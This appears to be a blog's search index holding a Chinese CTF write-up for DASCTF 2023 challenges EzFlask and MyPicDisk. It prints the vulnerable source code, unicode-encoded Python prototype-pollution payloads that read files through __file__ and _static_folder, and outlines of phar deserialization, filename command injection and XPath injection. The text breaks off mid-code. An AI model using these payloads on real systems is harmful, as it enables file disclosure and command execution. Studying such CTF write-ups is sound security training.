<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/posts/6893ad0d.html"/>
      <url>/posts/6893ad0d.html</url>
      
        <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE-xpath注入</title>
      <link href="/posts/9d9aaae5.html"/>
      <url>/posts/9d9aaae5.html</url>
      
        <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> XXE-xpath注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401-Web</title>
      <link href="/posts/46437d33.html"/>
      <url>/posts/46437d33.html</url>
      
        <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 